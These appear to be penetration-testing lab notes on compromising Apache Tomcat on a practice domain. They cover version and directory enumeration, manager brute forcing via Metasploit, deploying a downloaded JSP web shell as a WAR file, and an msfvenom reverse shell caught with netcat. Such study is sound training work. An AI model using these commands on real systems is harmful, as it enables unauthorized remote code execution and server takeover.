### Enumeration

Navigate to an invalid page states the Tomcat version:

![[Pasted image 20250202140119.png]]

Also use Curl

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

Typical Tomcat layout:

```bash
gobuster -u http://web01.inlanefreight.local:8180/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://web01.inlanefreight.local:8180/
[+] Threads      : 10
[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2025/02/02 14:03:38 Starting gobuster
=====================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
```

### Attack

Brute Forcing:

Use the Metasploit module `scanner/http/tomcat_mgr_login`

RCE:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

```bash
zip -r backup.war cmd.jsp
```

Login into Manager and upload/deploy the war file, and execute:

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

To clean up, select `Undeploy`.

Reverse Shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your-IP> LPORT=4443 -f war > backup1.war
```

Upload/deploy, then click `backup1`

```bash
sudo nc -lvp 4443
Listening on 0.0.0.0 4443
Connection received on app-dev.inlanefreight.local 39786

id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```



